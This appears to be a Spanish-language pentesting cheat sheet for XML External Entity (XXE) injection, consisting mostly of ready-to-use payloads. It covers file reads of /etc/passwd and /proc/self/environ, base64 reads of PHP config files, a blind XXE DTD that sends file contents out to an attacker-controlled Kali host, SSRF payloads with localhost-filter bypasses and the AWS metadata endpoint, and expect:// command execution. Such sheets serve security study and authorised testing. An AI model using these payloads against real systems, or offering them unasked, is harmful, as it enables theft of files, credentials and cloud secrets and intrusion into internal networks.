# XXE — XML External Entity Injection

Inyección de entidades externas en XML para leer ficheros internos, SSRF y RCE.

---

## Ficheros

| Fichero | Contenido |
|---|---|
| `guiaXXEi.txt` | Metodología completa — básico, php://filter, Blind XXE, SSRF, RCE |

---

## Decisión rápida

```
¿Hay reflejo en la respuesta?
  SÍ → XXE básico con file:// o php://filter
  NO → Blind XXE con DTD externo

¿El fichero es .php?
  SÍ → php://filter/read=convert.base64-encode/resource=...
  NO → file:///ruta/fichero

¿Acceder a servicios internos?
  → SYSTEM "http://IP_interna:puerto/"
```

---

## XXE básico — leer ficheros

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<test>&xxe;</test>
```

**Ficheros útiles:**
```
file:///etc/passwd
file:///etc/hosts
file:///etc/hostname
file:///proc/self/environ
file:///C:/Windows/win.ini
```

---

## XXE + php://filter (leer .php sin ejecutar)

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM
"php://filter/read=convert.base64-encode/resource=/var/www/html/config.php">]>
<test>&xxe;</test>
```

```bash
# Decodificar respuesta
echo "<cadena_base64>" | base64 -d
```

---

## Blind XXE — exfiltración con DTD externo

```bash
# 1. Crear exfil.dtd en Kali
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://[KALI_IP]/?x=%file;'>">
%eval;
%exfil;

# 2. Servir
python3 -m http.server 80

# 3. Payload al servidor vulnerable
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://[KALI_IP]/exfil.dtd"> %xxe;]><test>x</test>
```

> `&#x25;` = `%` en hex. Necesario para anidar entidades parámetro dentro de otra entidad parámetro — el parser lo resuelve en dos pasadas.

---

## XXE + SSRF

```xml
<!DOCTYPE root [
  <!ENTITY test SYSTEM "http://maquina_interna/recurso.txt">
]><root>&test;</root>
```

**Bypass de filtros localhost:**

| Payload | Equivale a |
|---|---|
| `http://2130706433/` | `http://127.0.0.1` |
| `http://[::]:80/` | IPv6 loopback |
| `http://169.254.169.254/` | AWS metadata |

---

## XXE to RCE

```xml
<!-- PHP con módulo expect (labs) -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]>
<test>&xxe;</test>
```

---

## Flujo en BurpSuite

1. Intercepta petición con XML (`Content-Type: text/xml` o parámetro `?xml=`)
2. Manda al Repeater (`Ctrl+R`)
3. Añade `<!DOCTYPE ...>` **antes** del nodo raíz
4. Referencia `&xxe;` en un campo que se refleje en la respuesta
5. Send → observa la respuesta

> Si el XML va en GET → URL-encodea el payload (`Ctrl+U` en Burp)  
> Si va en POST body → pega directamente sin encodear

---

## Resumen de técnicas

| Tipo | Técnica | Resultado |
|---|---|---|
| XXE básico | `SYSTEM file://` | Lectura de ficheros |
| XXE + PHP | `php://filter/base64-encode` | Lectura de .php |
| Blind XXE | DTD externo + `http://` | Exfiltración OOB |
| XXE to RCE | `expect://` o Java XMLDecoder | Ejecución de comandos |
| XXE + SSRF | `SYSTEM http://interna` | Acceso a red interna |
